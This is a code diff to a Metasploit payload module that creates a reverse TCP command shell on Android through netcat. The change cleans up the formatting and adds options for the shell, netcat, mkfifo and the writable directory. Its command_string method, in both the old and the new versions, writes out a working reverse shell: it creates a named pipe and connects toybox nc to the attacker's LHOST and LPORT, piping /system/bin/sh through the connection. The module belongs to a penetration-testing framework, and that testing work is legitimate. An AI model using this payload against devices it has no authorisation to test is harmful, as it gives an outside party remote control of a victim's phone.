@@ -18,10 +18,7 @@ module MetasploitModule
     super(merge_info(info,
       'Name'          => 'Android Command Shell, Reverse TCP (via netcat)',
       'Description'   => 'Creates an interactive shell via netcat',
-      'Author'         =>
-        [
-          'Auxilus',
-        ],
+      'Author'        => [ 'Auxilus' ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'android',
       'Arch'          => ARCH_CMD,
@@ -29,12 +26,15 @@ module MetasploitModule
       'Session'       => Msf::Sessions::CommandShell,
       'PayloadType'   => 'cmd',
       'RequiredCmd'   => 'toybox',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
+      'Payload'       => { 'Offsets' => { }, 'Payload' => '' }
       ))
+    register_options(
+      [
+        OptString.new('SHELL', [ true, "The shell to execute.", "/system/bin/sh" ]),
+        OptString.new('NETCAT', [ true, "The netcat command to use.", "toybox nc" ]),
+        OptString.new('MKFIFO', [ true, "The mkfifo command to use.", "mkfifo" ]),
+        OptString.new('WritableDir', [ true, "The temporary directory to use.", "/sdcard/" ]),
+      ])
   end
 
   #
@@ -48,7 +48,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
-    "/system/bin/toybox mkfifo /sdcard/#{backpipe}; /system/bin/toybox nc #{datastore['LHOST']} #{datastore['LPORT']} 0</sdcard/#{backpipe} | /system/bin/sh >/sdcard/#{backpipe} 2>&1; rm /sdcard/#{backpipe}"
+    backpipe = datastore['WritableDir'] + Rex::Text.rand_text_alpha_lower(4+rand(4))
+    "#{datastore['MKFIFO']} #{backpipe}; #{datastore['NETCAT']} #{datastore['LHOST']} #{datastore['LPORT']} 0<#{backpipe} | #{datastore['SHELL']} >#{backpipe} 2>&1; rm #{backpipe}"
   end
 end
